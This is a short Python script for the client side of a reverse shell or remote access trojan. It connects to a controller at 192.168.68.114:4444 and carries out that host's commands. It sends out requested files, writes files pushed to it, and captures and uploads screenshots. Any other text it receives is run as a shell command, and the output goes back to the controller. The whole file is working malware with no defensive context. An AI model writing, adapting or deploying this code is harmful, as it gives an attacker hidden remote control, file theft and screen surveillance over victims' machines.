import os
import socket
import subprocess
import pyscreenshot

s = socket.socket()         

port = 4444

# connect to the server on local computer 
    
s.connect(("192.168.68.114", port))

while True:
	rcv_msg=s.recv(1024).decode()
	if rcv_msg=="end":
		break
	elif rcv_msg=="download":
		file_name=s.recv(1024).decode()
		with open(file_name, "rb") as f:
			data=f.read()
			s.send(data)
	elif rcv_msg=="send":
		file_name=s.recv(1024).decode()
		with open(file_name, "wb") as f:
			data=s.recv(1024)
			f.write(data)
	elif rcv_msg=="screenshot":
		image = pyscreenshot.grab()
		image.save("temp_screen.png")
		
		with open("temp_screen.png", "rb") as f:
			data = f.read()
		# delete file after sending
		os.remove("temp_screen.png")
		# Send exact byte size first, padded to 16 bytes
		file_size = len(data)
		s.send(str(file_size).zfill(16).encode())
		
		# Send complete file payload
		s.sendall(data)
	else: 
		process = subprocess.Popen(
			rcv_msg, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
		) #os command execution

		output, error = process.communicate()
		#if no output was generatd, send error message
		if not output:
			output = error
		#if command returns no output, send "No output" message
		if not output and not error:
			output = "No output"
		
		s.send(output.encode())
s.close()     

